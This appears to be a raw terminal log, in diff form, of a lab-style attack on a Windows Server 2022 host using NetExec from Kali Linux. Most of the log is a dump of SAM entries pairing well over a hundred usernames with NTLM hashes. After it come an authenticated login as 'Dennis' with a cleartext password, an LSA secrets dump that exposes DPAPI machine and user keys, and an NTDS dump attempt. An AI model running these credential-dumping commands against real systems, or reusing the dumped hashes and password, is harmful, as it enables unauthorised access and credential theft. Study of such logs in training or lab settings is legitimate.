+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anthony:1632:aad3b435b51404eeaad3b435b51404ee:b40c0adb15c77a208aa4ac620f7523d1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Donald:1633:aad3b435b51404eeaad3b435b51404ee:f29a78b74b9ee35c7d53d58f035d58d3:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Karen:1634:aad3b435b51404eeaad3b435b51404ee:2d0560adce4a59519726b8e03ea46e0c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Adam:1635:aad3b435b51404eeaad3b435b51404ee:cc08cd3280716686f2ddd9d0a742e0c1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Grace:1636:aad3b435b51404eeaad3b435b51404ee:23760b34d1decaf51c60373d02451a28:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bobby:1637:aad3b435b51404eeaad3b435b51404ee:93aa0b46e5735a6c75a8d54b0ae3b267:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roger:1638:aad3b435b51404eeaad3b435b51404ee:d829f439310b30a72067f617adf6cd80:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Austin:1639:aad3b435b51404eeaad3b435b51404ee:3d36a10a07cfe610dad0cdfb91198c32:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Evelyn:1640:aad3b435b51404eeaad3b435b51404ee:5bea6ef3a27afd20293b94abfc8987a6:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brandon:1641:aad3b435b51404eeaad3b435b51404ee:b50ffe8099277e6ea44c949e99eca19f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kyle:1642:aad3b435b51404eeaad3b435b51404ee:50bd1cda87effe77a99b4282d006cf6b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joshua:1643:aad3b435b51404eeaad3b435b51404ee:a8dfd5877a04d5962da9f5c998c8b643:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Raymond:1644:aad3b435b51404eeaad3b435b51404ee:0594e4fa4e2d80e3f80e5d523a2b3a5a:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gabriel:1645:aad3b435b51404eeaad3b435b51404ee:1d44d88aeae21fe2b78dfe3204a89f6b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emma:1646:aad3b435b51404eeaad3b435b51404ee:5681e5048b28d553a57784d0b2b36c84:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Margaret:1647:aad3b435b51404eeaad3b435b51404ee:f03db410097b025ed3905cd3ce5b628c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Maria:1648:aad3b435b51404eeaad3b435b51404ee:ee17ca58fecb9b6a47dca39a86845d54:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Louis:1649:aad3b435b51404eeaad3b435b51404ee:664497840b37ce68c4a74af5689d5f11:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bruce:1650:aad3b435b51404eeaad3b435b51404ee:8f78ea6fe1076fab18f4b7ae97948362:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julie:1651:aad3b435b51404eeaad3b435b51404ee:5210c7278b6f8c268945d2eb9a15723e:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Larry:1652:aad3b435b51404eeaad3b435b51404ee:74fd5ecb474cbdb32d74efc861605512:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Vincent:1653:aad3b435b51404eeaad3b435b51404ee:34921ad29cd7ee429b0305a423945e66:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brian:1654:aad3b435b51404eeaad3b435b51404ee:12c6b575c21c1f78a53a792b7a930c16:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lawrence:1655:aad3b435b51404eeaad3b435b51404ee:ae80b656001bb0cc6bc9109906204604:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emily:1656:aad3b435b51404eeaad3b435b51404ee:467197a98e36a86124e125ed336490c9:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Helen:1657:aad3b435b51404eeaad3b435b51404ee:e30ff7ff2ae0ba92f5d90e84586d1481:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Juan:1658:aad3b435b51404eeaad3b435b51404ee:2583e77f371baf90de31d43a09201906:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Henry:1659:aad3b435b51404eeaad3b435b51404ee:cef2eb521883d390b32b0b5bb916f7bb:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Heather:1660:aad3b435b51404eeaad3b435b51404ee:0672ec782d89d486c03d1042f15787c4:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patricia:1661:aad3b435b51404eeaad3b435b51404ee:050f8e59f5d9b8f3b5d7fe4bf3ade02d:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Randy:1662:aad3b435b51404eeaad3b435b51404ee:9bf3c77b1e4ba4c3e18b5db07e867acf:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tiffany:1663:aad3b435b51404eeaad3b435b51404ee:6a3d3b48c3b9dc408b095f80a032ec9d:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephen:1664:aad3b435b51404eeaad3b435b51404ee:1a4b9cfedcb909577865e1f51a6aa639:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gerald:1665:aad3b435b51404eeaad3b435b51404ee:7f24062f009a74521200c1dd29c18728:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jessica:1666:aad3b435b51404eeaad3b435b51404ee:1423c4a651a20282d3855a5f67e0b6b3:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beau:1667:aad3b435b51404eeaad3b435b51404ee:2139002eea4c6b37af20a865c97c1f26:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marilyn:1668:aad3b435b51404eeaad3b435b51404ee:bfd1eb5903ac9c8eada38684a3553ac8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Walter:1669:aad3b435b51404eeaad3b435b51404ee:0ef0eae03bfbfbcb47ff55828e1f7cdb:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alan:1670:aad3b435b51404eeaad3b435b51404ee:f9d1467c6e0b80f56afbcaebda02b29f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jesse:1671:aad3b435b51404eeaad3b435b51404ee:a39e54c1e2a406a9602c8b0a70a9d520:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  John:1672:aad3b435b51404eeaad3b435b51404ee:4552a9acbbae3a4d74d10140ece12ce8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Russell:1673:aad3b435b51404eeaad3b435b51404ee:e8667c44224ba3706f5934c6a56dfec1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eric:1674:aad3b435b51404eeaad3b435b51404ee:9269f4b408627b02bd29930d4c4494de:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Laura:1675:aad3b435b51404eeaad3b435b51404ee:07965609d2c715bd385fa154300dad54:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Wayne:1676:aad3b435b51404eeaad3b435b51404ee:6f7fe8c538f8ef1fbd17dc6f99f24a21:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeremy:1677:aad3b435b51404eeaad3b435b51404ee:56056d1d0a35d3ab6bc54077ddf8eecc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eugene:1678:aad3b435b51404eeaad3b435b51404ee:19bb289e129b36bab71e038aa4993b3f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Willie:1679:aad3b435b51404eeaad3b435b51404ee:4c69ac7520fd213ba3ace599d6394a88:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicole:1680:aad3b435b51404eeaad3b435b51404ee:cae6c14e98570cf743579a588b604d36:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kelly:1681:aad3b435b51404eeaad3b435b51404ee:60d4440a7215b74a67ea2618a595e941:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patrick:1682:aad3b435b51404eeaad3b435b51404ee:613f6187908308e2742147a131efb588:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joe:1683:aad3b435b51404eeaad3b435b51404ee:d7b2bfadd02b84cd881ca1822192a52c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gloria:1684:aad3b435b51404eeaad3b435b51404ee:59db5bc0d1e7634c8d5d1123bc612623:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mark:1685:aad3b435b51404eeaad3b435b51404ee:204d40a7984db321ed4330a66a88bb83:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frank:1686:aad3b435b51404eeaad3b435b51404ee:b642d28e6af7a359a1a0b8af15587870:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Danielle:1687:aad3b435b51404eeaad3b435b51404ee:8a9ab6d6d58d08c311fb93231d8b1c96:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michelle:1688:aad3b435b51404eeaad3b435b51404ee:ac6082ee641705cdef887de97b00fbae:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Olivia:1689:aad3b435b51404eeaad3b435b51404ee:b7b9afe06e7dabc7020c1b87f3d99fca:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carl:1690:aad3b435b51404eeaad3b435b51404ee:7f9466e182c5758097365814ecf7814e:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diana:1691:aad3b435b51404eeaad3b435b51404ee:ad41bbedeef87f75b1a5f2aab9ec4977:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Zachary:1692:aad3b435b51404eeaad3b435b51404ee:c7ea16ec392dade1edd232096309f5c9:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Megan:1693:aad3b435b51404eeaad3b435b51404ee:2d7cc15b82225a5e982292d37f413530:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Billy:1694:aad3b435b51404eeaad3b435b51404ee:d5365541d2da4f085eca1cdc5b507ba8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diane:1695:aad3b435b51404eeaad3b435b51404ee:c617a6d6fee5e822e5cf3070c1b97c5a:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brenda:1696:aad3b435b51404eeaad3b435b51404ee:0d141bec26d9e93156413cad1de4fc28:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Justin:1697:aad3b435b51404eeaad3b435b51404ee:0a9d6ef6cb42b13000b9a6b52bd5180f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Hannah:1698:aad3b435b51404eeaad3b435b51404ee:62bd17bbbb6c6e11f88c4826d438a010:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Debra:1699:aad3b435b51404eeaad3b435b51404ee:43c0aafffc8c064b4f8cdae1a5b83736:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harry:1700:aad3b435b51404eeaad3b435b51404ee:fd2c304cb02f387b43df259f5e827ca5:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Madison:1701:aad3b435b51404eeaad3b435b51404ee:16a9562f912f728e2b6e3549065d5684:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cheryl:1702:aad3b435b51404eeaad3b435b51404ee:bd08aeb69003db612812abaf2747ee2b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kenneth:1703:aad3b435b51404eeaad3b435b51404ee:33b3ee2925712fb8735805f61081efdc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Bryan:1704:aad3b435b51404eeaad3b435b51404ee:6202fc527c9de45428c3081a02e71571:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judy:1705:aad3b435b51404eeaad3b435b51404ee:fdeaba31cad7e60faf845b6fc01bd61f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rose:1706:aad3b435b51404eeaad3b435b51404ee:849238439e4ec60e5a10d94442fb42a2:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Johnny:1707:aad3b435b51404eeaad3b435b51404ee:d251b2d1eb9074a48b46e5a7f2fabdc0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Benjamin:1708:aad3b435b51404eeaad3b435b51404ee:a5127cb510cdddca3453226359f64534:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joseph:1709:aad3b435b51404eeaad3b435b51404ee:0c61039f010b2fbb88fe449fbf262477:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Charles:1710:aad3b435b51404eeaad3b435b51404ee:6364271e1a2232e42ecb3406eeb8f823:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carol:1711:aad3b435b51404eeaad3b435b51404ee:6364271e1a2232e42ecb3406eeb8f823:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  William:1712:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Thomas:1713:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  James:1714:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Daniel:1715:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alexander:1716:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Aaron:1717:aad3b435b51404eeaad3b435b51404ee:6c5107c7916021c3b4d024aba0e83b9b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rachel:1718:aad3b435b51404eeaad3b435b51404ee:50869b6849770530d5674b3747dd0689:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rebecca:1719:aad3b435b51404eeaad3b435b51404ee:e2d69740ed967989d27529b8c01c0598:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Anna:1720:aad3b435b51404eeaad3b435b51404ee:c6456120d7f69635a42c93047c91f2f0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathy:1721:aad3b435b51404eeaad3b435b51404ee:7496fefc068843a8464ab95559131554:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathleen:1722:aad3b435b51404eeaad3b435b51404ee:9a5c2592f3d497516dec1d5b659dc4bd:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christine:1723:aad3b435b51404eeaad3b435b51404ee:2b7f05501288a7ac90bb89b40fdb8083:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judith:1724:aad3b435b51404eeaad3b435b51404ee:cc4306222071ac3fc5c084bcf9d64524:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jonathan:1725:aad3b435b51404eeaad3b435b51404ee:7d13a461c9a87722ec46a4ca7e04a659:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephanie:1726:aad3b435b51404eeaad3b435b51404ee:72b9101e51ade219e98c4f8e03e7b7a3:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrew:1727:aad3b435b51404eeaad3b435b51404ee:93d6bb33e0932a83eec780fd13bb8049:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lori:1728:aad3b435b51404eeaad3b435b51404ee:b12c22804d0c95c93390b69a9d956a06:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Philip:1729:aad3b435b51404eeaad3b435b51404ee:ce49c875291aeab8fd3b9af0f3d186a8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Abigail:1730:aad3b435b51404eeaad3b435b51404ee:42077d932918c040b9f0a1d5802d15fa:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ryan:1731:aad3b435b51404eeaad3b435b51404ee:da2c66f50266f11cbc848ea65561145d:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dorothy:1732:aad3b435b51404eeaad3b435b51404ee:1f3908683fea626d22f711e0c1d04174:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Richard:1733:aad3b435b51404eeaad3b435b51404ee:a1cd5fe3e18bbab8a72fd9425bdd71c9:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marie:1734:aad3b435b51404eeaad3b435b51404ee:6a2126d1ed92f47d07da223583daf93c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Angela:1735:aad3b435b51404eeaad3b435b51404ee:60e9644e9c45a9d06c905586a1e9bf76:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janice:1736:aad3b435b51404eeaad3b435b51404ee:864b9d9e2da0263e79b269c4855d3b17:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jordan:1737:aad3b435b51404eeaad3b435b51404ee:03af59285ea9097dd63aef7da11283e9:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dylan:1738:aad3b435b51404eeaad3b435b51404ee:11f465a866e828bf0ce11d3f8afddc3e:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samuel:1739:aad3b435b51404eeaad3b435b51404ee:57095b89cf29f8a9b18961ecc4c95d7f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janet:1740:aad3b435b51404eeaad3b435b51404ee:7ddb2a96ae69e8aa03ac9486c4d0c130:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Doris:1741:aad3b435b51404eeaad3b435b51404ee:97df6d12d2489f79b3b44a6364190efd:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Paul:1742:aad3b435b51404eeaad3b435b51404ee:91adfcad28e96f646b920995d1c0e2d8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Carolyn:1743:aad3b435b51404eeaad3b435b51404ee:d2359e0a0c8faac4d5cd49c9fabf3e30:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Melissa:1744:aad3b435b51404eeaad3b435b51404ee:821fd0c2b026f6c54fedc7671e2dd1e1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Elizabeth:1745:aad3b435b51404eeaad3b435b51404ee:65d75e5a9d12ad87369cc0cb3b230dab:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Susan:1746:aad3b435b51404eeaad3b435b51404ee:65d75e5a9d12ad87369cc0cb3b230dab:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Andrea:1747:aad3b435b51404eeaad3b435b51404ee:65d75e5a9d12ad87369cc0cb3b230dab:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathryn:1748:aad3b435b51404eeaad3b435b51404ee:65d75e5a9d12ad87369cc0cb3b230dab:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tyler:1749:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Linda:1750:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joan:1751:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christina:1752:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Matthew:1753:aad3b435b51404eeaad3b435b51404ee:55a64f17995301d46885178d8a6d9e33:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Brittany:1754:aad3b435b51404eeaad3b435b51404ee:f0928e186923ee0e8501edf7cf614e84:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sharon:1755:aad3b435b51404eeaad3b435b51404ee:d2a98ab0bca6a86ff3b5955078f6e121:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Alice:1756:aad3b435b51404eeaad3b435b51404ee:6e3e8967b550d3afe16232e4d588d638:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nathan:1757:aad3b435b51404eeaad3b435b51404ee:2a5e2eba3660cc6cd55328bf8f627a13:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Edward:1758:aad3b435b51404eeaad3b435b51404ee:76c0252e7b4c3886982dad0f920ccb51:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sean:1759:aad3b435b51404eeaad3b435b51404ee:00c0f48ecdc4d912a34fdefc40df40b5:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Beverly:1760:aad3b435b51404eeaad3b435b51404ee:15eb89cff8b59f2ed89619ef6e09dc95:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Denise:1761:aad3b435b51404eeaad3b435b51404ee:683f97f750c6c2cef38657e1629b3a72:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gary:1762:aad3b435b51404eeaad3b435b51404ee:cd549419f2cc64d71f54b3d61d9c005a:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Virginia:1763:aad3b435b51404eeaad3b435b51404ee:90964cce54fb96df352347db73845dbc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Terry:1764:aad3b435b51404eeaad3b435b51404ee:bee13683243a3db45cb8c27735fedbef:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Noah:1765:aad3b435b51404eeaad3b435b51404ee:9357130a4cc89833a1a65ebfa3b67a5f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cynthia:1766:aad3b435b51404eeaad3b435b51404ee:f32c453959ec52ea784b4c3d398d6f2d:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Natalie:1767:aad3b435b51404eeaad3b435b51404ee:5bb8b409c0f532fd3289b72f0ff4ad60:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ann:1768:aad3b435b51404eeaad3b435b51404ee:1c30674c93aafd88b7add307bfc03094:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Arthur:1769:aad3b435b51404eeaad3b435b51404ee:9e4f8e25199bf5aed96e2b26d652c271:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michael:1770:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christopher:1771:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gregory:1772:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jack:1773:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dennis:1774:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jerry:1775:aad3b435b51404eeaad3b435b51404ee:589b85762d8ab451401df29aa7fdc417:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joyce:1776:aad3b435b51404eeaad3b435b51404ee:e68f11a99d641b29e10446a99d9ecad5:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Shirley:1777:aad3b435b51404eeaad3b435b51404ee:547fb1815c36426643d9137196927a6f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Betty:1778:aad3b435b51404eeaad3b435b51404ee:085180359f8b63cb4bdf8fcd2fa1f79e:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Martha:1779:aad3b435b51404eeaad3b435b51404ee:70a3767d60332590c38f932d7c94b2b8:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mary:1780:aad3b435b51404eeaad3b435b51404ee:07c87f687e83f40dcc4536b70b5deebd:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Catherine:1781:aad3b435b51404eeaad3b435b51404ee:fc023fad2d9dc17af13dd8dfd863e1d3:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Katherine:1782:aad3b435b51404eeaad3b435b51404ee:d551c4d80bdf58c41b739ae6698e81c6:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ethan:1783:aad3b435b51404eeaad3b435b51404ee:0cd68729384ccdd7b9d7f4daa3abf3cc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeffrey:1784:aad3b435b51404eeaad3b435b51404ee:958f706b4c9b4244866911182b2d235f:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Theresa:1785:aad3b435b51404eeaad3b435b51404ee:c77d5ddd8b85708b6a1341efbc5fff05:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Scott:1786:aad3b435b51404eeaad3b435b51404ee:6d13d8e191b6542a398e23b21aed19c5:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Pamela:1787:aad3b435b51404eeaad3b435b51404ee:ad046cf1f7c9de88b688f3a8d151bb07:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Peter:1788:aad3b435b51404eeaad3b435b51404ee:af2cb672bb568505cbc7759c46e89455:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julia:1789:aad3b435b51404eeaad3b435b51404ee:0d4b665fc6dd62fda4ead2e3860e0250:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sarah:1790:aad3b435b51404eeaad3b435b51404ee:4684fd1301ce2daf1bc1be82212d5393:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roy:1791:aad3b435b51404eeaad3b435b51404ee:79da316d3d314de76096c5fbac2c2cb0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Douglas:1792:aad3b435b51404eeaad3b435b51404ee:f8988d6b5988acab49a1965504b8e010:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lauren:1793:aad3b435b51404eeaad3b435b51404ee:b41ada6658156799ccac32ebd8e89019:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mildred:1794:aad3b435b51404eeaad3b435b51404ee:932c7c21879d6c416311bfec597c9733:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lisa:1795:aad3b435b51404eeaad3b435b51404ee:28d5bb1837c217f99412442001456677:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kevin:1796:aad3b435b51404eeaad3b435b51404ee:32ebb62672eaccc143fd8a9cd74d2cde:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Added 204 SAM hashes to the database
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --lsa
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Dumping LSA secrets
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  dpapi_machinekey:0x21ceb51d1fe70afa40f049ebc36db32f281c2742
+dpapi_userkey:0xe5fff16b775db8bb060d85decfeae461486de16f
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Dumped 1 LSA secrets to /home/kali/.nxc/logs/lsa/10.10.234.39_None_2025-09-23_100754.secrets and /home/kali/.nxc/logs/lsa/10.10.234.39_None_2025-09-23_100754.cached
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --ntds
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Dumped 0 NTDS hashes to /home/kali/.nxc/logs/ntds/10.10.234.39_None_2025-09-23_100808.ntds of which 0 were added to the database
